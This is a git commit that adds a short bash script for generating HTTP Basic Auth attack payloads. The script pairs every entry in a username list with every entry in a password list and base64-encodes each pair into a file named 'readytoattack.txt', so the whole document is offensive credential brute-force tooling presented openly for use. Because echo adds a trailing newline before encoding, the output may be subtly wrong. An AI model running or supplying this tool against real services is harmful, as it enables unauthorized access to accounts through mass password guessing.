2cc52a50ec0f328202b1dd6e8c519132c00c772d
snoopy101 <85396965+ali01imani01@users.noreply.github.com>
2023-06-06 11:07:04 +0330

    Add files via upload

---
+++ basicauthgen.sh
@@ -0,0 +1,27 @@
+#! /usr/bin/bash
+
+# Generate base64 payloads for BasicAuth attack :)
+# usage: bash basicauthgen.sh -u ul.txt -p pw.txt
+# final output: readytoattack.txt
+# Author: snoopy
+while getopts 'u:p:' flag; do
+  case "${flag}" in
+    u) user_list="${OPTARG}";;
+    p) password_lists="${OPTARG}";;
+  esac
+done
+
+while IFS= read -r line0
+do 
+
+    sed "s/$/:$line0/"  "$user_list" >> sstemp.txt
+    
+done < "$password_lists"
+
+while IFS= read -r line1
+do
+
+    echo "$line1" | base64 >> readytoattack.txt
+
+done < sstemp.txt
+rm sstemp.txt
